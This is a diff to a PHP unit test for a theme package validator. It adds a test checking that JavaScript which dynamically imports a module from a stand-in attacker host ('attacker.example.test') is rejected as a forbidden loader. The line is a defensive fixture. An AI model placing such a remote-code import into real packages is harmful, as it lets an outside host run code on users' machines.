@@ -103,6 +103,14 @@ final class ThemeV2PackageTest extends TestCase
         }
     }
 
+    public function test_identifiable_remote_code_loader_is_rejected(): void
+    {
+        $js = 'import("https://attacker.example.test/mod.js")';
+        $this->expectException(InvalidArgumentException::class);
+        $this->expectExceptionMessage('forbidden JavaScript loader');
+        $this->check($this->manifest($js), ['dist/index.js' => $js]);
+    }
+
     public function test_ssr_remains_disabled_until_isolated_runtime_is_approved(): void
     {
         $manifest = $this->manifest();
